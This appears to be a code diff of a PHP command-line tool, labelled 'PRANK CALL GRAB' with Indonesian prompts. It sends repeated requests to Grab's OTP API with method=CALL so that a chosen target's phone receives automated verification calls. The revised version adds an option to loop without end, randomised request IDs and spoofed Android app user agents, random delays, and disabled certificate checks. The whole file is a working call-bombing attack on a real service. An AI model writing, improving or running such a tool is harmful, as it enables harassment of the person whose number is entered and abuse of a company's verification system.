@@ -1,110 +1,95 @@
 <?php
-function get(){
-	return trim(fgets(STDIN));
+function get_input(){
+    return trim(fgets(STDIN));
 }
-class prankCall{
-	public function __construct($no){
-		$this->number = $no;
-	}
-	private function get(){
-		return trim(fgets(STDIN));
-	}
-	private function correct($no){
-		$cek = substr($no,0,2);
-		if($cek=="08"){
-			$no = "62".substr($no,1);
-		}
-		return $no;
-	}
-	private function ekse(){
-		$no = $this->correct($this->number);
-		$rand = rand(0123456,9999999);
-		$rands = $this->randStr(12);
-		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
-		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
-		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-		$h[] = "Content-Type: application/x-www-form-urlencoded";
-		$h[] = "Content-Length: ".strlen($post);
-		$h[] = "Host: api.grab.com";
-		$h[] = "Connection: close";
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-		curl_setopt($ch, CURLOPT_POST, 1);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		$x = curl_exec($ch); curl_close($ch);
-		$ekse = json_decode($x,true);
-		if(empty($ekse['challengeID'])){
-			echo "Gagal\n";
-		}else{
-			echo "Sukses\n";
-		}
-	}
-	private function loop($many,$sleep=null){
-		$a=0;
-		$no = $this->correct($this->number);
-		while($a<$many){
-			$rand = rand(0123456,9999999);
-			$rands = $this->randStr(12);
-			$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
-			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-			$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
-			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-			$h[] = "Content-Type: application/x-www-form-urlencoded";
-			$h[] = "Content-Length: ".strlen($post);
-			$h[] = "Host: api.grab.com";
-			$h[] = "Connection: close";
-			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-			curl_setopt($ch, CURLOPT_POST, 1);
-			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-			$x = curl_exec($ch); curl_close($ch);
-			$ekse = json_decode($x,true);
-			if(empty($ekse['challengeID'])){
-				continue;
-			}else{
-				$nn = $a+1;
-				echo "[$nn] Sukses\r";
-				$a++;
-			}
-			if($sleep!=null) sleep($sleep);
-			if($a>=$many) echo "\nCompleted!\n";
-		}
-	}
-	private function randStr($l){
-		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
-		$word = "";
-		for($a=0;$a<$l;$a++){
-			$word .= $data{rand(0,strlen($data)-1)};
-		}
-		return $word;
-	}
-	public function run(){
-		while(true){
-			echo "?Loop(y/n)		";
-			$loop = $this->get();
-			if($loop=="y" OR $loop=="n"){
-				break;
-			}else{
-				echo "Jika ya jawab y jika tidak jawab n\n";
-				continue;
-			}
-		}
-		if($loop=="y"){
-			echo "?Many			";
-			$many = $this->get();
-			$this->loop($many);
-		}else{
-			$this->ekse();
-		}
-	}
+
+class PrankCall {
+    private $number;
+    private $headers = [];
+    
+    public function __construct($no) {
+        $this->number = $this->validate_number($no);
+    }
+
+    private function validate_number($no) {
+        $no = preg_replace('/[^0-9]/', '', $no);
+        if (substr($no, 0, 1) == '0') {
+            $no = '62' . substr($no, 1);
+        }
+        return $no;
+    }
+
+    private function generate_headers() {
+        return [
+            "x-request-id: " . $this->generate_uuid(),
+            "User-Agent: Grab/6.39.0 (Android 13; Build " . $this->random_str(7) . ")",
+            "Content-Type: application/x-www-form-urlencoded",
+            "Accept-Language: id-ID;q=1.0, en-us;q=0.9, en;q=0.8"
+        ];
+    }
+
+    private function generate_uuid() {
+        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
+            mt_rand(0, 0xffff),
+            mt_rand(0, 0x0fff) | 0x4000,
+            mt_rand(0, 0x3fff) | 0x8000,
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
+        );
+    }
+
+    private function random_str($length) {
+        return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyz', 5)), 0, $length);
+    }
+
+    public function send_otp() {
+        $ch = curl_init();
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => 'https://api.grab.com/grabid/v2/phone/otp',
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => http_build_query([
+                'method' => 'CALL',
+                'countryCode' => 'ID',
+                'phoneNumber' => $this->number,
+                'templateID' => 'pax_android_production'
+            ]),
+            CURLOPT_HTTPHEADER => $this->generate_headers(),
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 10
+        ]);
+
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        return ($http_code == 200 && strpos($response, 'challengeID') !== false);
+    }
+
+    public function run() {
+        echo "Jumlah percobaan (0 untuk terus menerus): ";
+        $count = (int)get_input();
+
+        $attempt = 0;
+        while ($count == 0 || $attempt < $count) {
+            $success = $this->send_otp();
+            $attempt++;
+            
+            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses' : 'Gagal') . PHP_EOL;
+            
+            if($count != 0 && $attempt >= $count) break;
+            sleep(rand(1, 3));
+        }
+        
+        echo "Proses selesai!" . PHP_EOL;
+    }
 }
-echo "#################################\n# Copyright : @xptra | SGB-Team #\n#################################\n";
-echo "?Number			";
-$no = get();
-$n = new prankCall($no);
-$n->run();
+
+echo "########## PRANK CALL GRAB ##########\n";
+echo "Nomor Target (contoh: 08123456789): ";
+$number = get_input();
+
+$prank = new PrankCall($number);
+$prank->run();
+?>
